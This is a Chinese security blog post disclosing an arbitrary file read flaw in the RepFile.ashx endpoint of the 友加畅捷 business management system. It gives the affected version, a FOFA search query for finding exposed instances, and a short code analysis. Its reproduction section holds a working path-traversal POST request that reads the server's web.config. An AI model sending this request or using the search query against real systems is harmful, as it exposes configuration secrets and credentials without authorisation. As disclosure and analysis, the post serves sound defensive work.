---
title: "友加畅捷管理系统 RepFile.ashx 文件读取漏洞"
source: https://mrxn.net/jswz/youjiasoft-ReportDesign-RepFile-fileread.html
asset_dir: assets/友加畅捷管理系统-repfile.ashx-文件读取漏洞
---

# 友加畅捷管理系统 RepFile.ashx 文件读取漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/12/7 08:31
- 583浏览
- [0评论](#comment)
- 8分钟阅读

深入探索

数据库

软件

授权

---

# 漏洞简介

友加畅捷管理系统是一款专为小微商贸流通企业设计的财务业务一体化管理[软件](#)，涵盖进销存、财务、分销及移动管理等多个模块，旨在帮助企业实现高效的业务运营和财务核算。

漏洞修复方案

该系统的 `RepFile.ashx` 接口存在任意[文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)漏洞。攻击者可利用此漏洞，未经授权地读取服务器上的任意文件，包括但不限于系统配置文件和数据库配置文件等敏感信息。 成功利用此漏洞可能导致企业内部敏感数据泄露，对系统的机密性和完整性构成潜在威胁。

# 影响版本

18.8000.1083.1000

# fofa语法

> icon\_hash="2049187099" || fid="zzt8lL7SUwIIZQXZY6rTSw=="

# 漏洞分析

深入探索

Docker加速服务

计算机安全

云安全解决方案

直接查看 `/ReportDesign/RepFile.ashx` 代码执行逻辑

物流软件安全

[![友加畅捷管理系统 RepFile.ashx 文件读取漏洞](images/img-001-77a84b47a87d.webp)](https://image.mrxn.net/dda141c1851246fc9d527b635d77ffc0.webp)

根据参数`Type` 进入不同的处理逻辑，当`Type=ReadReportCpfFile` 时，看下它的实现逻辑

[![友加畅捷管理系统 RepFile.ashx 文件读取漏洞](images/img-002-af267d07ab9e.webp)](https://image.mrxn.net/92fb97a4c32542afac26bcca82cc625a.webp)

`RepFile`参数直接被拼接进系统`Report`目录下，然后使用`xmlDoc.Load()` 加载文件后将其内容直接在响应里回显`xmlDoc.Load()` 加载后的文件内容。但是`xmlDoc.Load()` 只能解析XML文件，不能读取其他文件，因此这个[文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)漏洞利用有限。

网络安全

# 漏洞复现

```
POST /ReportDesign/RepFile.ashx HTTP/1.1
Host: youjiasoft.mrxn.net
Content-Type: application/x-www-form-urlencoded

RepFile=..%2fweb.config&Type=ReadReportCpfFile
```

[![友加畅捷管理系统 RepFile.ashx 文件读取漏洞](images/img-003-83073d4a38e4.webp)](https://image.mrxn.net/a753758b5b5e4773a3f7c17e50296a73.webp)

成功读取到 `web.config` 文件内容。

计算机服务器

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
